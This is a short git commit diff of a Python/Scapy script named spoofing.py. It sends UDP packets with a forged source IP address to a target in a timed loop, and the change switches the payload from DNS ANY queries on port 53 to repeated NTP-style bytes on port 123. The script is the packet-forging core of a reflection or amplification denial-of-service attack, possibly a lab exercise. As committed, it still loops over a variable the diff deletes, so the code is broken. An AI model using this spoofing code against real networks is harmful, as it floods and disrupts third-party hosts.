fb9d9e2977f4fcdfd3ab4f61ea5320bacfc977b5
nubi12336 <syislu62823@kaist.ac.kr>
2021-04-13 14:37:06 +0900

    d

--- spoofing.py
+++ spoofing.py
@@ -4,12 +4,11 @@ import time
 A= "192.168.30.1"
 B= "192.168.20.1"
 C= RandShort()
-D= 53
-query_name = "google.com"
-query_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"]
+D= 123
+E= "\x1b\x00\x03\x2a" * 12
 
 start = time.time()
 while (time.time() - start < 10):
     for i in range(0,len(query_type)):
-        spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
+        spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / E
         send(spoofed_packet)
